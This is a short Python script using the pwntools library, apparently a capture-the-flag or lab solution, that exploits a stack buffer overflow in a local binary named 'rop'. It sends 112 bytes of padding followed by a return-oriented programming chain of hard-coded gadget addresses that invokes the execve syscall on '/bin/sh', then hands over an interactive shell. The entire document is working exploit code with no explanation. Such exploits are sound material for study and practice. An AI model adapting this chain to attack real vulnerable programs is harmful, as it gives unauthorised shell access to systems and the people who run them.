from pwn import *

p = process('./rop')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
str_bin_sh = 0x080be408
int_0x80 = 0x08049421

rop = flat([pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, str_bin_sh, int_0x80])

payload = 112 * b'A' + rop

p.sendline(payload)
p.interactive()